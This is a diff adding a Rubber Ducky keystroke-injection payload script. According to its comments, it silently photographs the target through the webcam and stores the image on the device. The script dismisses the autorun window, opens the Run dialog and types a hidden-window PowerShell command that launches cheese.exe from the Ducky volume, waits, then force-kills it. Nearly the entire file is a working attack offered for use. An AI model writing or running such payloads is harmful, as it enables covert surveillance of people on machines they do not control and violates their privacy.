@@ -1,0 +1,14 @@
+REM Author: Pinguino-HK
+
+REM Cheese is a Rubber Ducky Script that will execute cheese.exe which will take a photo from the webcam and save it to rubber ducky.
+REM The speed delay can be adapted/modified
+REM the ALF F4 is only if the target had autorun which will pop the Ducky folder
+
+ATTACKMODE HID STORAGE
+DELAY 5000
+ALT F4
+ESC
+DELAY 2000
+GUI r
+DELAY 1000
+STRINGLN powershell  -WindowStyle Hidden Start-Process -FilePath ((Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\cheese.exe'); Start-Sleep -Seconds 7; taskkill /F /IM cheese.exe
